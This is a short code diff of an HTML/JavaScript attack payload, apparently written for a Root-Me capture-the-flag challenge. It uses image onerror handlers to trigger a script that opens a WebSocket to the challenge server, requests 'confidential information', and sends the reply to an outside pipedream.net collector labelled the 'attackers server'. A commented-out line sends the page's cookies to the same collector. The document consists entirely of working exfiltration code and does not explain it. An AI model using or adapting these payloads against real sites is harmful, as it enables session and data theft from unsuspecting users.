@@ -1,17 +1,21 @@
 "Hello" 
 
 <img src="https://en6gc9c8vfzvo.x.pipedream.net?firstImage">
-<img src=x onerror="window.location.href='https://en6gc9c8vfzvo.x.pipedream.net?imageError' + document.cookie">
+<img src=x onerror="gogo()">
+<!--<img src=x onerror="window.location.href='https://en6gc9c8vfzvo.x.pipedream.net?imageError' + document.cookie"> -->
 <script>
-var ws = new WebSocket("ws://ctf17.root-me.org/ws");
-ws.onopen = start
-ws.onmessage = handleReply
-function start(event) {
-  ws.send("READY"); //Send the message to retreive confidential information
+function gogo() {
+	var ws = new WebSocket("ws://ctf17.root-me.org/ws");
+	ws.onopen = start
+	ws.onmessage = handleReply
+	function start(event) {
+	  ws.send("READY"); //Send the message to retreive confidential information
+	}
+	function handleReply(event) {
+	  //Exfiltrate the confidential information to attackers server
+	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
+	}
+	ws.send(`hello`);
 }
-function handleReply(event) {
-  //Exfiltrate the confidential information to attackers server
-  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
-}
-ws.send(`hello`);
+
 </script>
